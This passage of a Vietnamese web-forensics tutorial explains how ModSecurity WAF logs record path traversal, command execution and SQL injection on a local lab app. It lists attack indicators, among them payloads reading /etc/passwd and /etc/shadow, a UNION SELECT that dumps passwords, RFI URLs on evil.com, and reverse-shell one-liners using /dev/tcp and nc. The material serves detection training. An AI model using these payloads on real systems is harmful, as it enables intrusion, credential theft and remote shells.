Message: Warning. Matched phrase "etc/passwd" at ARGS:image. [file "/usr/share/modsecurity-crs/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"] [line "501"] [id "932160"] [msg "Remote Command Execution: Unix Shell Code Found"] [data "Matched Data: etc/passwd found within ARGS:image: ../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-shell"] [tag "platform-unix"] [tag "attack-rce"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/152/248/88"] [tag "PCI/6.5.2"]
Message: Warning. Operator GE matched 5 at TX:anomaly_score. [file "/usr/share/modsecurity-crs/rules/REQUEST-949-BLOCKING-EVALUATION.conf"] [line "94"] [id "949110"] [msg "Inbound Anomaly Score Exceeded (Total Score: 43)"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-generic"]
Message: Warning. Operator GE matched 5 at TX:inbound_anomaly_score. [file "/usr/share/modsecurity-crs/rules/RESPONSE-980-CORRELATION.conf"] [line "92"] [id "980130"] [msg "Inbound Anomaly Score Exceeded (Total Inbound Score: 43 - SQLI=0,XSS=0,RFI=0,LFI=35,RCE=5,PHPI=0,HTTP=0,SESS=0): individual paranoia level scores: 43, 0, 0, 0"] [ver "OWASP_CRS/3.3.5"] [tag "event-correlation"]
Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Pattern match "^[\\\\\\\\d.:]+$" at REQUEST_HEADERS:Host. [file "/usr/share/modsecurity-crs/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"] [line "736"] [id "920350"] [msg "Host header is a numeric IP address"] [data "127.0.0.1:9090"] [severity "WARNING"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-protocol"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/210/272"] [tag "PCI/6.5.10"] [hostname "127.0.0.1"] [uri "/view.php"] [unique_id "aVzWNmLm1Ko6nAjfB6CuewAAAAU"]
Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Pattern match "(?i)(?:\\\\\\\\x5c|(?:%(?:c(?:0%(?:[2aq]f|5c|9v)|1%(?:[19p]c|8s|af))|2(?:5(?:c(?:0%25af|1%259c)|2f|5c)|%46|f)|(?:(?:f(?:8%8)?0%8|e)0%80%a|bg%q)f|%3(?:2(?:%(?:%6|4)6|F)|5%%63)|u(?:221[56]|002f|EFC8|F025)|1u|5c)|0x(?:2f|5c)|\\\\\\\\/))(?:%(?:(?:f(?:(?:c%80|8)%8)?0%8 ..." at REQUEST_URI_RAW. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "48"] [id "930100"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: /../ found within REQUEST_URI_RAW: /view.php?image=../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"] [hostname "127.0.0.1"] [uri "/view.php"] [unique_id "aVzWNmLm1Ko6nAjfB6CuewAAAAU"]
Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Pattern match "(?i)(?:\\\\\\\\x5c|(?:%(?:c(?:0%(?:[2aq]f|5c|9v)|1%(?:[19p]c|8s|af))|2(?:5(?:c(?:0%25af|1%259c)|2f|5c)|%46|f)|(?:(?:f(?:8%8)?0%8|e)0%80%a|bg%q)f|%3(?:2(?:%(?:%6|4)6|F)|5%%63)|u(?:221[56]|002f|EFC8|F025)|1u|5c)|0x(?:2f|5c)|\\\\\\\\/))(?:%(?:(?:f(?:(?:c%80|8)%8)?0%8 ..." at ARGS:image. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "48"] [id "930100"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: /../ found within ARGS:image: ../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"] [hostname "127.0.0.1"] [uri "/view.php"] [unique_id "aVzWNmLm1Ko6nAjfB6CuewAAAAU"]
Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Pattern match "(?:^|[\\\\\\\\/])\\\\\\\\.\\\\\\\\.(?:[\\\\\\\\/]|$)" at REQUEST_URI. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "72"] [id "930110"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: /../ found within REQUEST_URI: /view.php?image=../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"] [hostname "127.0.0.1"] [uri "/view.php"] [unique_id "aVzWNmLm1Ko6nAjfB6CuewAAAAU"]
Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Pattern match "(?:^|[\\\\\\\\/])\\\\\\\\.\\\\\\\\.(?:[\\\\\\\\/]|$)" at REQUEST_URI. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "72"] [id "930110"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: /../ found within REQUEST_URI: /view.php?image=../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"] [hostname "127.0.0.1"] [uri "/view.php"] [unique_id "aVzWNmLm1Ko6nAjfB6CuewAAAAU"]
Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Pattern match "(?:^|[\\\\\\\\/])\\\\\\\\.\\\\\\\\.(?:[\\\\\\\\/]|$)" at ARGS:image. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "72"] [id "930110"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: ../ found within ARGS:image: ../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"] [hostname "127.0.0.1"] [uri "/view.php"] [unique_id "aVzWNmLm1Ko6nAjfB6CuewAAAAU"]
Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Pattern match "(?:^|[\\\\\\\\/])\\\\\\\\.\\\\\\\\.(?:[\\\\\\\\/]|$)" at ARGS:image. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "72"] [id "930110"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: ../ found within ARGS:image: ../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"] [hostname "127.0.0.1"] [uri "/view.php"] [unique_id "aVzWNmLm1Ko6nAjfB6CuewAAAAU"]
Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Matched phrase "etc/passwd" at ARGS:image. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "98"] [id "930120"] [msg "OS File Access Attempt"] [data "Matched Data: etc/passwd found within ARGS:image: ../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"] [tag "PCI/6.5.4"] [hostname "127.0.0.1"] [uri "/view.php"] [unique_id "aVzWNmLm1Ko6nAjfB6CuewAAAAU"]
Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Matched phrase "etc/passwd" at ARGS:image. [file "/usr/share/modsecurity-crs/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"] [line "501"] [id "932160"] [msg "Remote Command Execution: Unix Shell Code Found"] [data "Matched Data: etc/passwd found within ARGS:image: ../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-shell"] [tag "platform-unix"] [tag "attack-rce"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/152/248/88"] [tag "PCI/6.5.2"] [hostname "127.0.0.1"] [uri "/view.php"] [unique_id "aVzWNmLm1Ko6nAjfB6CuewAAAAU"]
Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Operator GE matched 5 at TX:anomaly_score. [file "/usr/share/modsecurity-crs/rules/REQUEST-949-BLOCKING-EVALUATION.conf"] [line "94"] [id "949110"] [msg "Inbound Anomaly Score Exceeded (Total Score: 43)"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-generic"] [hostname "127.0.0.1"] [uri "/view.php"] [unique_id "aVzWNmLm1Ko6nAjfB6CuewAAAAU"]
Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Operator GE matched 5 at TX:inbound_anomaly_score. [file "/usr/share/modsecurity-crs/rules/RESPONSE-980-CORRELATION.conf"] [line "92"] [id "980130"] [msg "Inbound Anomaly Score Exceeded (Total Inbound Score: 43 - SQLI=0,XSS=0,RFI=0,LFI=35,RCE=5,PHPI=0,HTTP=0,SESS=0): individual paranoia level scores: 43, 0, 0, 0"] [ver "OWASP_CRS/3.3.5"] [tag "event-correlation"] [hostname "127.0.0.1"] [uri "/view.php"] [unique_id "aVzWNmLm1Ko6nAjfB6CuewAAAAU"]
Apache-Handler: application/x-httpd-php
Stopwatch: 1767691830023818 3131 (- - -)
Stopwatch2: 1767691830023818 3131; combined=1396, p1=281, p2=874, p3=23, p4=121, p5=97, sr=56, sw=0, l=0, gc=0
Response-Body-Transformed: Dechunked
Producer: ModSecurity for Apache/2.9.7 (http://www.modsecurity.org/); OWASP_CRS/3.3.5.
Server: Apache/2.4.58 (Ubuntu)
Engine-Mode: "DETECTION_ONLY"

--49e1f51a-Z--
```
- Có thể thấy rằng, phần output hiển thị chi tiết audit của access logs chứa request cũng như response body, có thể là bất kỳ hoạt động độc hại nào.
- Ta thấy rằng có đoạn message hiển thị cảnh báo của một pattern khớp với Path Traversal. Nó làm rõ rằng một malicious string khớp với mẫu được tìm thấy trong `REQUEST_URI_RAW` và nó là một vấn đề quan trọng.
- Thêm vào đó, các lỗi của `Apache-Error` được hiển thị, một số cái là cảnh báo khác của tấn công Path Traversal, nhưng tại thời điểm này một pattern khác đã khớp. `Apache-Error` khác là cảnh báo của một điểm đầu vào bất thường vượt quá ngưỡng đã đặt. Tổng điểm đầu vào, loại tấn công và điểm paranoia level đã được ghi lại, cung cấp cái nhìn về mức độ tấn công.
> Để hiểu ý nghĩa của log data trong một cuộc điều tra forensics, việc lọc các thông chi tiết không liên quan và chỉ giữ lại phần dữ liệu quan trọng rất quan trọng.

#### b) Remote Command Execution (RCE):
- Trong một cuộc tấn công RCE, một attacker có thể thực thi mã độc trên server tương tự như việc thực thi commands trong terminal. Dưới tình huống nào đó, nó có thể được nhắc tới như một lỗ hổng Command Injection.
- Ví dụ, nếu một websites cho phép users enter một command để tìm kiếm file, một attacker có thể enter một command đẻ xoá tất cả files trên server bằng cách thêm vào commands như `; rm -rf /` vào input field. Điều này có thể thương lượng với toàn bộ hệ thống nếu website có được sự cho phép cần thiết để thực thi các lệnh này.
> Thuật ngữ RCE có thể thay thế giữa Remote Command Execution và Remote Code Execution, nhưng cả hai đều nhắc tới một lỗ hổng cho phép một attacker thực thi code và/hoặc commands remotely.
- Đi đến http://127.0.0.1:9090/command.php để thử nghiệm. Web app cho phép ta enter commands, thực thi chúng và quay lại output. Trong trường hợp không có security checks thích hợp, việc này có thể được exploited để thương lượng và tẩy đi toàn bộ hệ thống.
- Để tạo logs trên server, thực thi các commands sau theo thứ tự trên http://127.0.0.1:9090/command.php:
    - `id`
    - `cat /etc/passwd`
    - `cat /etc/shadow`
- Kiểm tra `access.log`:

![image](https://hackmd.io/_uploads/S11RY9sEbg.png)
Có thể thấy rằng, logs chỉ show duy nhất requests và không tiết lộ commands được input bởi user vì đó là requests GET và POST. Đây là nơi WAF thực hiện hai vai trò là request và response body. Vì vậy, để xem commands nào được input bởi user vào làm cách nào web app respond, ta xem xét WAF logs.
- Xem logs của requests nơi command `id` được entered, ta có thể thấy rằng hầu như không có cảnh báo vì command này quá ngắn để khớp với bất kỳ patterns nào. Tuy nhiên, với command `cat etc/passwd`, nó dò ra LFI (Local File Inclusion) và RCE (Remote Command Execution):
``` ubuntu
<SNIP>

Message: Warning. Matched phrase "etc/passwd" at ARGS:cmd. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "97"] [id "930120"] [msg "OS File Access Attempt"] [data "Matched Data: etc/passwd found within ARGS:cmd: cat /etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"] [tag "PCI/6.5.4"]
Message: Warning. Matched phrase "etc/passwd" at ARGS:cmd. [file "/usr/share/modsecurity-crs/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"] [line "500"] [id "932160"] [msg "Remote Command Execution: Unix Shell Code Found"] [data "Matched Data: etc/passwd found within ARGS:cmd: cat/etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"] [tag "application-multi"] [tag "language-shell"] [tag "platform-unix"] [tag "attack-rce"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/152/248/88"] [tag "PCI/6.5.2"]

<SNIP>

Apache-Error: [file "apache2_util.c"] [line 271] [level 3] [client 172.17.0.1] ModSecurity: Warning. Matched phrase "etc/passwd" at ARGS:cmd. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "97"] [id "930120"] [msg "OS File Access Attempt"] [data "Matched Data: etc/passwd found within ARGS:cmd: cat /etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"] [tag "PCI/6.5.4"] [hostname "127.0.0.1"] [uri "/command.php"] [unique_id "Y-rT-PsFa_lKkx8ckcXpMAAAAAQ"]
Apache-Error: [file "apache2_util.c"] [line 271] [level 3] [client 172.17.0.1] ModSecurity: Warning. Matched phrase "etc/passwd" at ARGS:cmd. [file "/usr/share/modsecurity-crs/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"] [line "500"] [id "932160"] [msg "Remote Command Execution: Unix Shell Code Found"] [data "Matched Data: etc/passwd found within ARGS:cmd: cat/etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"] [tag "application-multi"] [tag "language-shell"] [tag "platform-unix"] [tag "attack-rce"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/152/248/88"] [tag "PCI/6.5.2"] [hostname "127.0.0.1"] [uri "/command.php"] [unique_id "Y-rT-PsFa_lKkx8ckcXpMAAAAAQ"]

<SNIP>

Apache-Error: [file "apache2_util.c"] [line 271] [level 3] [client 172.17.0.1] ModSecurity: Warning. Operator GE matched 5 at TX:inbound_anomaly_score. [file "/usr/share/modsecurity-crs/rules/RESPONSE-980-CORRELATION.conf"] [line "91"] [id "980130"] [msg "Inbound Anomaly Score Exceeded (Total Inbound Score: 13 - SQLI=0,XSS=0,RFI=0,LFI=5,RCE=5,PHPI=0,HTTP=0,SESS=0): individual paranoia level scores: 13, 0, 0, 0"] [ver "OWASP_CRS/3.3.2"] [tag "event-correlation"] [hostname "127.0.0.1"] [uri "/command.php"] [unique_id "Y-rT-PsFa_lKkx8ckcXpMAAAAAQ"]

<SNIP>
```
- Tương tự, với command `cat /etc/shadow`, có thể thấy rằng server không respond với nội dung của file vì server đang chạy như một user không có quyền `www-data` và không có truy cập cần thiết để đọc file `/etc/shadow`. Có thể confirm bởi:

![image](https://hackmd.io/_uploads/rk__mioEZl.png)
- Tuy nhiên, server vẫn phát hiện ra nỗ lực của LFI và RCE:
``` ubuntu
<SNIP>

Message: Warning. Matched phrase "etc/shadow" at ARGS:cmd. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "97"] [id "930120"] [msg "OS File Access Attempt"] [data "Matched Data: etc/shadow found within ARGS:cmd: cat /etc/shadow"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"] [tag "PCI/6.5.4"]
Message: Warning. Matched phrase "etc/shadow" at ARGS:cmd. [file "/usr/share/modsecurity-crs/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"] [line "500"] [id "932160"] [msg "Remote Command Execution: Unix Shell Code Found"] [data "Matched Data: etc/shadow found within ARGS:cmd: cat/etc/shadow"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"] [tag "application-multi"] [tag "language-shell"] [tag "platform-unix"] [tag "attack-rce"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/152/248/88"] [tag "PCI/6.5.2"]

<SNIP> 

Apache-Error: [file "apache2_util.c"] [line 271] [level 3] [client 172.17.0.1] ModSecurity: Warning. Matched phrase "etc/shadow" at ARGS:cmd. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "97"] [id "930120"] [msg "OS File Access Attempt"] [data "Matched Data: etc/shadow found within ARGS:cmd: cat /etc/shadow"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"] [tag "PCI/6.5.4"] [hostname "127.0.0.1"] [uri "/command.php"] [unique_id "Y-rT_V10ftOo0AKdI-JC2gAAAAU"]
Apache-Error: [file "apache2_util.c"] [line 271] [level 3] [client 172.17.0.1] ModSecurity: Warning. Matched phrase "etc/shadow" at ARGS:cmd. [file "/usr/share/modsecurity-crs/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"] [line "500"] [id "932160"] [msg "Remote Command Execution: Unix Shell Code Found"] [data "Matched Data: etc/shadow found within ARGS:cmd: cat/etc/shadow"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"] [tag "application-multi"] [tag "language-shell"] [tag "platform-unix"] [tag "attack-rce"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/152/248/88"] [tag "PCI/6.5.2"] [hostname "127.0.0.1"] [uri "/command.php"] [unique_id "Y-rT_V10ftOo0AKdI-JC2gAAAAU"]

<SNIP>

Apache-Error: [file "apache2_util.c"] [line 271] [level 3] [client 172.17.0.1] ModSecurity: Warning. Operator GE matched 5 at TX:inbound_anomaly_score. [file "/usr/share/modsecurity-crs/rules/RESPONSE-980-CORRELATION.conf"] [line "91"] [id "980130"] [msg "Inbound Anomaly Score Exceeded (Total Inbound Score: 13 - SQLI=0,XSS=0,RFI=0,LFI=5,RCE=5,PHPI=0,HTTP=0,SESS=0): individual paranoia level scores: 13, 0, 0, 0"] [ver "OWASP_CRS/3.3.2"] [tag "event-correlation"] [hostname "127.0.0.1"] [uri "/command.php"] [unique_id "Y-rT_V10ftOo0AKdI-JC2gAAAAU"

<SNIP>
```
> File `error.log` có thể chứa thông tin được thêm vào về malicious requests xử lý bởi server.

#### c) SQL Injection (SQLi):
- Trong một tấn công SQLi, attackers thao tác với website's input fields để submit malicious SQL code sắp thêm vào server.
- Ví dụ, xem xét một website với trang login gồm username và password. Thông thường, website sẽ so sánh thông tin đăng nhập với thông tin được lưu trong database để xác định nếu user nên được cấp quyền truy cập. Nếu website's code có khả năng có lỗ hổng SQLi, attacker sẽ enter `' OR 1=1--` hay `UNION SELECT` vào username, về cơ bản điều này sẽ đánh lừa database trả về tất cả bản ghi, bỏ qua bước kiểm tra xác thực.
- Đi tới http://127.0.0.1:9090/users.php để thử nghiệm và nó sẽ hiển thị một danh sách users với một input field để ta có thể research user bằng usernames của họ.
- Để bắt đầu attack và tạo logs trên server, enter các payloads sau theo thứ tự:
    - `user1' and 1=1 #`

    ![image](https://hackmd.io/_uploads/H1WZjsi4Wl.png)
    - `user1' union select username, email, password from users #`

    ![image](https://hackmd.io/_uploads/SkTQqsoEWe.png)

    Chúng ta dùng payload đầu tiên để check rằng nếu web app dính lỗ hổng SQLi và payload thứ hai để xuất user's passwords từ database.

- Cả hai đều là POST requests, có thể check logs trong file `error.log`:

![image](https://hackmd.io/_uploads/HJGq9oiVbx.png)
- Có thể thấy rằng, chạy lệnh `cat` với `grep` cho ta thấy trực tiếp hai sự cố SQLi được tdò ra bởi WAF. Chi tiết audit logs có thể xem trong file `modsec_audit.log`.
> Thông thường `modsec_audit.log` sẽ có thể ghi request, response body và payload.

## III. Một số dấu hiệu của attack:
> Chuỗi tấn công thường gặp: Scan $\rightarrow$ Path Traversal $\rightarrow$ LFI $\rightarrow$ RCE $\rightarrow$ Webshell/Reverse Shell

### 1. SQL Injection (SQLi):
- Attacker chèn câu lệnh SQL vào input thường để bypass login, trích xuất dữ liệu, sửa hay xoá database.
- Dấu hiệu:
    - `' OR 1=1 --`
    - `" OR "1"="1`
    - `UNION SELECT`
    - `SELECT * FROM`
    - `information_schema`
    - `sleep(5)`
    - `benchmark(`
    - `%27` (encode của `'`)
- Log thường thấy: `access.log`, `database error log`

### 2. Local File Inclusion (LFI):
- Ứng dụng cho phép include file local trên server để đọc file nhạy cảm.
- Dấu hiệu:
    - `../`
    - `/etc/passwd`
    - `/etc/shadow`
    - `/proc/self/environ`
    - `file=../../etc/passwd`
    - Encode:
        - `%2e%2e%2f`
        - `%252e%252e%252f`
- Log thường thấy: `access.log`, `modsec_audit.log`, `error.log`

### 3. Remote File Inclusion (RFI):
- Ứng dụng include file từ server bên ngoài, thường để chạy webshell, có thể dẫn trực tiếp đến RCE.
- Dấu hiệu:
    - `http://evil.com/shell.txt`
    - `https://attacker/shell.php`
    - `file=http://`
    - `include=http://`
    - `allow_url_include`

### 4. Path Traversal:
- Thoát khỏi thư mục hiện tại để truy cập file ngoài phạm vi cho phép. Path Traversal là kỹ thuật, còn LFI là hậu quả.
- Dấu hiệu:
    - `../`
    - `..\\`
    - `/..;/`
    - `..%2f`
    - `..%5c`
    - `/var/www/../../etc/passwd`

### 5. Command Injection:
- Chèn lệnh hệ điều hành vào input (thường trong PHP, bash wrapper).
    - `; ls`
    - `; id`
    - `&& whoami`
    - `|| uname -a`
    - `| cat /etc/passwd`
    - ``id``
    - `$(id)`
- Log thường thấy: `access.log`, `modsec_audit.log`

### 6. Remote Code Execution (RCE):
- Kẻ tấn công thực thi mã lệnh tùy ý trên server.
- Dấu hiệu:
    - `id`
    - `whoami`
    - `uname -a`
    - `pwd`
    - `bash -i`
    - `/bin/bash`
    - `/bin/sh`
- Reverse Shell:
    - `bash -i >& /dev/tcp/IP/PORT 0>&1`
    - `nc -e /bin/sh`
    - `nc IP PORT`
    - `python -c 'import os; os.system(...)'`
- Obfuscation:
    - `%3B (;)`
    - `%26%26 (&&)`
    - `%7C%7C (||)`
    - Base64: `echo aWQ= | base64 -d | sh`
- Log thường thấy: `modsec_audit.log`, `error.log`

### 7. Scan/Reconnaissance:
- Giai đoạn do thám trước khi tấn công.
- Đặc điểm:
    - Nhiều request trong thời gian ngắn.
    - `404` liên tục.
    - Thay đổi User-Agent.
- Dấu hiệu:
    - `/phpmyadmin`
    - `/wp-admin`
    - `/admin`
    - `/login`
    - `/test`
    - `/backup`
    - `/config`
    - `/old`
    - `/.git/`
    - `/.env`
